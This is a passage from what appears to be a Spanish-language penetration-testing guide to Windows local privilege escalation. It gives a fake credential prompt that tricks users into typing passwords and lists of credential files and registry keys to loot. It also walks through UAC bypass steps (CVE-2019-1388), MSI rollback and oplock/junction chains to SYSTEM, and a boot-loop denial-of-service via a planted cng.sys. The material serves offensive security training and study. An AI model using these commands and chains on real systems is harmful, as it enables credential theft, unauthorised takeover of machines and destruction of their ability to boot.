[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Pedir credenciales

Siempre puedes **pedir al usuario que introduzca sus credenciales o incluso las credenciales de otro usuario** si crees que puede conocerlas (ten en cuenta que **pedir** las **credenciales** directamente al cliente es realmente **arriesgado**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Posibles nombres de archivo que contienen credenciales**

Archivos conocidos que hace algún tiempo contenían **passwords** en **texto claro** o **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
No se proporcionaron archivos propuestos para buscar.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credenciales en la RecycleBin

También deberías revisar la Bin para buscar credenciales dentro de ella

Para **recuperar contraseñas** guardadas por varios programas puedes usar: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Inside the registry

**Otras posibles claves del registry con credenciales**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extraer claves openssh del registro.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historial de navegadores

Debes comprobar las dbs donde se almacenan las contraseñas de **Chrome o Firefox**.\
También revisa el historial, los marcadores y los favoritos de los navegadores por si algunas **contraseñas están** almacenadas allí.

Herramientas para extraer contraseñas de navegadores:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **Sobrescritura de DLL COM**

**Component Object Model (COM)** es una tecnología integrada en el sistema operativo Windows que permite la **intercomunicación** entre componentes de software de distintos lenguajes. Cada componente COM se **identifica mediante un class ID (CLSID)** y cada componente expone funcionalidad a través de una o más interfaces, identificadas mediante interface IDs (IIDs).

Las clases e interfaces COM se definen en el registro bajo **HKEY\CLASSES\ROOT\CLSID** y **HKEY\CLASSES\ROOT\Interface** respectivamente. Este registro se crea fusionando **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Dentro de los CLSIDs de este registro puedes encontrar la subclave de registro **InProcServer32** que contiene un **valor predeterminado** que apunta a una **DLL** y un valor llamado **ThreadingModel** que puede ser **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) o **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Básicamente, si puedes **sobrescribir cualquiera de las DLLs** que se van a ejecutar, podrías **elevar privilegios** si esa DLL va a ser ejecutada por un usuario diferente.

Para aprender cómo los atacantes usan COM Hijacking como mecanismo de persistencia, revisa:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Búsqueda genérica de contraseñas en archivos y registro**

**Buscar contenidos de archivos**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Buscar un archivo con un nombre de archivo determinado**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Buscar en el registry nombres de clave y passwords**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Herramientas que buscan contraseñas

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin I have created this plugin to **automatically execute every metasploit POST module that searches for credentials** inside the victim.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automáticamente busca todos los archivos que contienen contraseñas mencionados en esta página.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) es otra gran herramienta para extraer contraseñas de un sistema.

The tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) busca **sessions**, **usernames** y **passwords** de varias herramientas que guardan estos datos en texto claro (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagina que **un proceso ejecutándose como SYSTEM abre un nuevo proceso** (`OpenProcess()`) con **acceso completo**. El mismo proceso **también crea un nuevo proceso** (`CreateProcess()`) **con privilegios bajos pero heredando todos los open handles del proceso principal**.\
Entonces, si tienes **acceso completo al proceso con privilegios bajos**, puedes tomar el **open handle al proceso privilegiado creado** con `OpenProcess()` e **inyectar un shellcode**.\
[Lee este ejemplo para obtener más información sobre **cómo detectar y explotar esta vulnerabilidad**.](leaked-handle-exploitation.md)\
[Lee este **otro post para una explicación más completa sobre cómo probar y abusar de más open handlers de procesos y threads heredados con distintos niveles de permisos (no solo acceso completo)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Los segmentos de memoria compartida, conocidos como **pipes**, permiten la comunicación entre procesos y la transferencia de datos.

Windows proporciona una función llamada **Named Pipes**, que permite que procesos no relacionados compartan datos, incluso a través de diferentes redes. Esto se asemeja a una arquitectura cliente/servidor, con roles definidos como **named pipe server** y **named pipe client**.

Cuando los datos se envían a través de un pipe por un **client**, el **server** que configuró el pipe tiene la capacidad de **asumir la identidad** del **client**, siempre que tenga los permisos necesarios de **SeImpersonate**. Identificar un **privileged process** que se comunica mediante un pipe que puedes imitar brinda una oportunidad de **obtener privilegios más altos** al adoptar la identidad de ese proceso una vez que interactúa con el pipe que estableciste. Para obtener instrucciones sobre cómo ejecutar un ataque así, se pueden encontrar guías útiles [**aquí**](named-pipe-client-impersonation.md) y [**aquí**](#from-high-integrity-to-system).

Además, la siguiente herramienta permite **interceptar la comunicación de un named pipe con una herramienta como burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **y esta herramienta permite listar y ver todos los pipes para encontrar privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

El servicio Telephony (TapiSrv) en modo servidor expone `\\pipe\\tapsrv` (MS-TRP). Un cliente autenticado remoto puede abusar de la ruta asíncrona de eventos basada en mailslot para convertir `ClientAttach` en una **escritura arbitraria de 4 bytes** sobre cualquier archivo existente que sea escribible por `NETWORK SERVICE`, y luego obtener privilegios de administrador de Telephony y cargar un DLL arbitrario como el servicio. Flujo completo:

- `ClientAttach` con `pszDomainUser` configurado en una ruta existente escribible → el servicio lo abre mediante `CreateFileW(..., OPEN_EXISTING)` y lo usa para escrituras de eventos asíncronos.
- Cada evento escribe el `InitContext` controlado por el atacante desde `Initialize` en ese handle. Registra una app de línea con `LRegisterRequestRecipient` (`Req_Func 61`), dispara `TRequestMakeCall` (`Req_Func 121`), recupera mediante `GetAsyncEvents` (`Req_Func 0`), y luego anula el registro/cierra para repetir escrituras deterministas.
- Agrégate a `[TapiAdministrators]` en `C:\Windows\TAPI\tsec.ini`, reconecta, y luego llama a `GetUIDllName` con una ruta DLL arbitraria para ejecutar `TSPI_providerUIIdentify` como `NETWORK SERVICE`.

Más detalles:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Consulta la página **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Los enlaces Markdown clicables reenviados a `ShellExecuteExW` pueden activar controladores URI peligrosos (`file:`, `ms-appinstaller:` o cualquier esquema registrado) y ejecutar archivos controlados por el atacante como el usuario actual. Ver:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Al obtener un shell como usuario, puede haber tareas programadas u otros procesos ejecutándose que **pasen credenciales en la línea de comandos**. El script de abajo captura las líneas de comandos de los procesos cada dos segundos y compara el estado actual con el anterior, mostrando cualquier diferencia.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Robando contraseñas de procesos

## De usuario local de bajos privilegios a NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Si tienes acceso a la interfaz gráfica (vía consola o RDP) y UAC está habilitado, en algunas versiones de Microsoft Windows es posible ejecutar una terminal o cualquier otro proceso como "NT\AUTHORITY SYSTEM" desde un usuario sin privilegios.

Esto hace posible escalar privilegios y omitir UAC al mismo tiempo con la misma vulnerabilidad. Además, no hace falta instalar nada y el binario usado durante el proceso está firmado y emitido por Microsoft.

Algunos de los sistemas afectados son los siguientes:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Para explotar esta vulnerabilidad, es necesario realizar los siguientes pasos:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## De Administrator Medium a High Integrity Level / UAC Bypass

Lee esto para **aprender sobre Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Luego **lee esto para aprender sobre UAC y UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## De Arbitrary Folder Delete/Move/Rename a SYSTEM EoP

La técnica descrita [**en este blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) con un exploit code [**disponible aquí**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

El ataque básicamente consiste en abusar de la función de rollback de Windows Installer para reemplazar archivos legítimos por otros maliciosos durante el proceso de desinstalación. Para ello, el atacante necesita crear un **malicious MSI installer** que será usado para secuestrar la carpeta `C:\Config.Msi`, la cual luego será usada por el Windows Installer para almacenar los rollback files durante la desinstalación de otros MSI packages, donde los rollback files habrían sido modificados para contener el malicious payload.

La técnica resumida es la siguiente:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Crear un `.msi` que instale un archivo inocuo (por ejemplo, `dummy.txt`) en una carpeta escribible (`TARGETDIR`).
- Marcar el instalador como **"UAC Compliant"**, para que un **non-admin user** pueda ejecutarlo.
- Mantener un **handle** abierto sobre el archivo después de la instalación.

- Step 2: Begin Uninstall
- Desinstalar el mismo `.msi`.
- El proceso de desinstalación comienza moviendo archivos a `C:\Config.Msi` y renombrándolos a archivos `.rbf` (rollback backups).
- **Poll the open file handle** usando `GetFinalPathNameByHandle` para detectar cuándo el archivo se convierte en `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- El `.msi` incluye una **custom uninstall action (`SyncOnRbfWritten`)** que:
- Señala cuando se ha escrito `.rbf`.
- Luego **espera** otro evento antes de continuar con la desinstalación.

- Step 4: Block Deletion of `.rbf`
- Cuando se señale, **abrir el archivo `.rbf`** sin `FILE_SHARE_DELETE` — esto **impide que sea eliminado**.
- Luego **signal back** para que la desinstalación pueda terminar.
- Windows Installer falla al intentar borrar el `.rbf`, y como no puede eliminar todo el contenido, **`C:\Config.Msi` no se elimina**.

- Step 5: Manually Delete `.rbf`
- Tú (attacker) eliminas manualmente el archivo `.rbf`.
- Ahora **`C:\Config.Msi` está vacío**, listo para ser hijacked.

> En este punto, **trigger the SYSTEM-level arbitrary folder delete vulnerability** para borrar `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recrear tú mismo la carpeta `C:\Config.Msi`.
- Establecer **weak DACLs** (por ejemplo, Everyone:F), y **mantener un handle abierto** con `WRITE_DAC`.

- Step 7: Run Another Install
- Instalar el `.msi` otra vez, con:
- `TARGETDIR`: Ubicación escribible.
- `ERROROUT`: Una variable que provoca un fallo forzado.
- Esta instalación se usará para disparar **rollback** otra vez, que lee `.rbs` y `.rbf`.

- Step 8: Monitor for `.rbs`
- Usar `ReadDirectoryChangesW` para vigilar `C:\Config.Msi` hasta que aparezca un nuevo `.rbs`.
- Capturar su nombre de archivo.

- Step 9: Sync Before Rollback
- El `.msi` contiene una **custom install action (`SyncBeforeRollback`)** que:
- Señala un evento cuando se crea `.rbs`.
- Luego **espera** antes de continuar.

- Step 10: Reapply Weak ACL
- Después de recibir el evento de `.rbs created`:
- El Windows Installer **reaplica strong ACLs** a `C:\Config.Msi`.
- Pero como todavía tienes un handle con `WRITE_DAC`, puedes **reaplicar weak ACLs** otra vez.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Sobrescribir el archivo `.rbs` con un **fake rollback script** que indica a Windows que:
- Restores tu archivo `.rbf` (malicious DLL) a una **ubicación privilegiada** (por ejemplo, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Señalar el evento de sync para que el instalador reanude.
- Se configura una **type 19 custom action (`ErrorOut`)** para **fallar intencionadamente la instalación** en un punto conocido.
- Esto provoca que **rollback** comience.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Lee tu `.rbs` malicioso.
- Copia tu DLL `.rbf` al destino.
- Ahora tienes tu **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Ejecutar un binario confiable **auto-elevated** (por ejemplo, `osk.exe`) que cargue la DLL que secuestraste.
- **Boom**: Tu código se ejecuta **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

La técnica principal de MSI rollback (la anterior) asume que puedes borrar una **carpeta completa** (por ejemplo, `C:\Config.Msi`). Pero, ¿qué pasa si tu vulnerability solo permite **arbitrary file deletion** ?

Podrías explotar **NTFS internals**: cada carpeta tiene un hidden alternate data stream llamado:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Este stream almacena los **metadatos del índice** de la carpeta.

Así que, si **eliminas el stream `::$INDEX_ALLOCATION`** de una carpeta, NTFS **elimina toda la carpeta** del filesystem.

Puedes hacer esto usando APIs estándar de eliminación de archivos como:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Aunque estés llamando a una API de eliminación de *archivo*, en realidad **elimina la carpeta نفسها**.

### De Eliminación de Contenido de Carpeta a SYSTEM EoP
¿Qué pasa si tu primitive no permite eliminar archivos/carpetas arbitrarios, pero sí **permite la eliminación del *contenido* de una carpeta controlada por el atacante**?

1. Paso 1: Configura una carpeta y archivo señuelo
- Crea: `C:\temp\folder1`
- Dentro de ella: `C:\temp\folder1\file1.txt`

2. Paso 2: Coloca un **oplock** en `file1.txt`
- El oplock **pausa la ejecución** cuando un proceso con privilegios intenta eliminar `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Paso 3: Activar proceso SYSTEM (p. ej., `SilentCleanup`)
- Este proceso analiza carpetas (p. ej., `%TEMP%`) e intenta eliminar su contenido.
- Cuando llega a `file1.txt`, el **oplock se activa** y cede el control a tu callback.

4. Paso 4: Dentro del callback del oplock – redirigir la eliminación

- Opción A: Mover `file1.txt` a otro lugar
- Esto vacía `folder1` sin romper el oplock.
- No elimines `file1.txt` directamente — eso liberaría el oplock prematuramente.

- Opción B: Convertir `folder1` en un **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opción C: Crear un **symlink** en `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Esto apunta al flujo interno de NTFS que almacena metadatos de la carpeta — al eliminarlo, se elimina la carpeta.

5. Paso 5: Liberar el oplock
- El proceso SYSTEM continúa e intenta eliminar `file1.txt`.
- Pero ahora, debido al junction + symlink, en realidad está eliminando:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Resultado**: `C:\Config.Msi` es eliminado por SYSTEM.

### De creación arbitraria de carpetas a DoS permanente

Explota una primitiva que te permite **crear una carpeta arbitraria como SYSTEM/admin** — incluso si **no puedes escribir archivos** o **establecer permisos débiles**.

Crea una **carpeta** (no un archivo) con el nombre de un **driver crítico de Windows**, por ejemplo:
```
C:\Windows\System32\cng.sys
```
- Este path normalmente corresponde al driver en modo kernel `cng.sys`.
- Si lo **pre-creas como una carpeta**, Windows falla al cargar el driver real durante el arranque.
- Entonces, Windows intenta cargar `cng.sys` durante el arranque.
- Ve la carpeta, **no puede resolver el driver real**, y **se bloquea o detiene el arranque**.
- No hay **fallback**, y **no hay recuperación** sin intervención externa (p. ej., reparación de arranque o acceso al disco).

### From privileged log/backup paths + OM symlinks to arbitrary file overwrite / boot DoS

Cuando un **servicio privilegiado** escribe logs/exports en un path leído desde una **config writable**, redirige ese path con **Object Manager symlinks + NTFS mount points** para convertir la escritura privilegiada en un overwrite arbitrario (incluso **sin** SeCreateSymbolicLinkPrivilege).

**Requirements**
- La config que almacena el path de destino es writable por el atacante (p. ej., `%ProgramData%\...\.ini`).
- Capacidad de crear un mount point a `\RPC Control` y un OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Una operación privilegiada que escriba en ese path (log, export, report).

**Example chain**
1. Lee la config para recuperar el destino privilegiado del log, por ejemplo `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` en `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Redirige el path sin admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Espera a que el componente privilegiado escriba el log (p. ej., el admin dispara "send test SMS"). La escritura ahora cae en `C:\Windows\System32\cng.sys`.
4. Inspecciona el objetivo sobrescrito (hex/PE parser) para confirmar la corrupción; reiniciar fuerza a Windows a cargar la ruta del driver manipulada → **boot loop DoS**. Esto también se generaliza a cualquier archivo protegido que un servicio privilegiado abra para escritura.

> `cng.sys` normalmente se carga desde `C:\Windows\System32\drivers\cng.sys`, pero si existe una copia en `C:\Windows\System32\cng.sys` puede intentarse primero, convirtiéndolo en un sumidero DoS fiable para datos corruptos.



## **From High Integrity to System**

### **New service**

Si ya estás ejecutando un proceso con High Integrity, la **ruta a SYSTEM** puede ser fácil simplemente **creando y ejecutando un nuevo servicio**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Al crear un binary de servicio asegúrate de que sea un servicio válido o de que el binary realice las acciones necesarias lo más rápido posible, ya que será killed en 20s si no es un servicio válido.

### AlwaysInstallElevated

Desde un proceso High Integrity podrías intentar **habilitar las entradas del registry AlwaysInstallElevated** e **instalar** un reverse shell usando un wrapper _**.msi**_.\
[Más información sobre las registry keys involucradas y sobre cómo instalar un paquete _.msi_ aquí.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Puedes** [**encontrar el código aquí**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Si tienes esos token privileges (probablemente esto lo encontrarás en un proceso ya High Integrity), podrás **abrir casi cualquier process** (no protected processes) con el privilegio SeDebug, **copiar el token** del process y crear un **arbitrary process con ese token**.\
Usando esta técnica normalmente se **selecciona cualquier process que se ejecute como SYSTEM con todos los token privileges** (_sí, puedes encontrar procesos SYSTEM sin todos los token privileges_).\
**Puedes encontrar un** [**ejemplo de código que ejecuta la técnica propuesta aquí**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Esta técnica la usa meterpreter para escalar en `getsystem`. La técnica consiste en **crear un pipe y luego crear/abusar de un service para escribir en ese pipe**. Después, el **server** que creó el pipe usando el privilegio **`SeImpersonate`** podrá **impersonate el token** del cliente del pipe (el service), obteniendo privilegios SYSTEM.\
Si quieres [**aprender más sobre name pipes deberías leer esto**](#named-pipe-client-impersonation).\
Si quieres leer un ejemplo de [**cómo pasar de high integrity a System usando name pipes deberías leer esto**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Si logras **hijackear una dll** que esté **siendo cargada** por un **process** que se ejecuta como **SYSTEM** podrás ejecutar código arbitrario con esos permisos. Por tanto, Dll Hijacking también es útil para este tipo de privilege escalation y, además, es **mucho más fácil de conseguir desde un proceso high integrity** ya que tendrá **write permissions** sobre las carpetas usadas para cargar dlls.\
**Puedes** [**aprender más sobre Dll hijacking aquí**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Check for misconfigurations and sensitive files (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Check for some possible misconfigurations and gather info (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Check for misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information. Use -Thorough in local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extracts crendentials from Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray gathered passwords across domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is a PowerShell ADIDNS/LLMNR/mDNS spoofer and man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Search for known privesc vulnerabilities (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Search for known privesc vulnerabilities (needs to be compiled using VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerates the host searching for misconfigurations (more a gather info tool than privesc) (needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extracts credentials from lots of softwares (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port of PowerUp to C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Check for misconfiguration (executable precompiled in github). Not recommended. It does not work well in Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Check for possible misconfigurations (exe from python). Not recommended. It does not work well in Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool created based in this post (it does not need accesschk to work properly but it can use it).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Reads the output of **systeminfo** and recommends working exploits (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Reads the output of **systeminfo** andrecommends working exploits (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

You have to compile the project using the correct version of .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). To see the installed version of .NET on the victim host you can do:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
